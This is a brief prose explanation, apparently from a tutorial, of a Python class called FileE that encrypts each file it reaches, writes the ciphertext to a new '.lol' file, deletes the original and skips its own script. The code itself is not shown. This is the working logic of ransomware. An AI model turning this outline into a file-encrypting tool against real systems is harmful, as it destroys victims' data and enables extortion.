Here's what the above class is doing:
1. The class is called FileE and it takes one argument, which is the location of the file.
2. We then print out the location of the file.
3. We then use a try/except statement to make sure that we don't run into any errors.
4. We then check if the target is a directory or not. If it's not, we continue with the code.
5. We open up the file in read-binary mode and save it in a variable called date.
6. We then save the name of the file in a variable called filename, and encrypt date using our box object and save it in a variable called encrypted.
7. If our target is not equal to our own script, we open up a new file with .lol as an extension (this will be explained later) and write our encrypted data into it, and then delete our original file (this will also be explained later).
8. If there's an error, we print out what that error is.
